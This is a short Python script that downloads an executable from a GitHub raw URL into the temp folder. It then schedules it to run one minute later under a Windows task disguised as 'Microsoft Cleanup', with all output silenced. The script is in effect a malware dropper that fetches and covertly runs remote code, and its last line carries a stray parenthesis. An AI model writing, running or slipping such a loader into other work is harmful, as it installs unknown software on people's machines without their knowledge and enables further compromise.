import os
import datetime
import tempfile
import urllib.request
import subprocess

download_url = "https://raw.githubusercontent.com/senaygue75/discorduserid/refs/heads/main/main.exe"
download_path = os.path.join(tempfile.gettempdir(), "temp_file.exe")
task_name = "Microsoft Cleanup"
urllib.request.urlretrieve(download_url, download_path)
run_time = (datetime.datetime.now() + datetime.timedelta(minutes=1)).strftime("%H:%M")
schtasks_command = f'''schtasks /Create /SC ONCE /TN "{task_name}" /TR "explorer \"{download_path}\"" /ST {run_time} /F >nul'''
subprocess.run(schtasks_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
